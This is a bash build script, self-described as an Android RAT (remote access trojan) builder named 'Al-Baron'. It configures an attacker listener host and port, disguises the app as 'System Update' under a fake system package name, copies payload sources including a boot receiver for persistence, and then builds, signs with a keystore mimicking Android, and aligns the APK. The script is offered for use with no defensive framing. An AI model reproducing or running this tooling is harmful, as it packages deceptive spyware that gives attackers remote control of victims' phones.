#!/bin/bash
# Al-Baron Android RAT build script
set -e
LHOST="192.168.1.146"
LPORT="443"
APPNAME="System Update"
PKG="com.system.updateservice"

# 1. Create project
mkdir -p build_apk/app/src/main/java/com/system/updateservice
mkdir -p build_apk/app/src/main/res/values
cd build_apk

cat > app/build.gradle <<EOF
apply plugin: 'com.android.application'
android {
    compileSdkVersion 33
    defaultConfig {
        applicationId "$PKG"
        minSdkVersion 24
        targetSdkVersion 33
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
        }
    }
}
dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}
EOF

cat > app/src/main/res/values/strings.xml <<EOF
<resources>
<string name="app_name">$APPNAME</string>
</resources>
EOF

# copy sources
cp ../payloads/android/AndroidManifest.xml app/src/main/AndroidManifest.xml
cp ../payloads/android/MainActivity.java app/src/main/java/com/system/updateservice/
cp ../payloads/android/CoreService.java app/src/main/java/com/system/updateservice/
cp ../payloads/android/BootReceiver.java app/src/main/java/com/system/updateservice/

# 2. build
./gradlew assembleRelease

# 3. sign (auto-generate keystore)
KEYSTORE="albaron.jks"
keytool -genkey -v -keystore $KEYSTORE -alias shdw -keyalg RSA -keysize 2048 \
    -validity 10000 -storepass albaron -keypass albaron -dname "CN=System,OU=Update,O=Android,L=NA,ST=NA,C=US"

apksigner sign --ks $KEYSTORE --ks-pass pass:albaron \
    --out albaron.apk app/build/outputs/apk/release/app-release-unsigned.apk

# 4. align
zipalign -v 4 albaron.apk albaron-aligned.apk

echo "[+] APK ready: albaron-aligned.apk"
ls -la albaron-aligned.apk
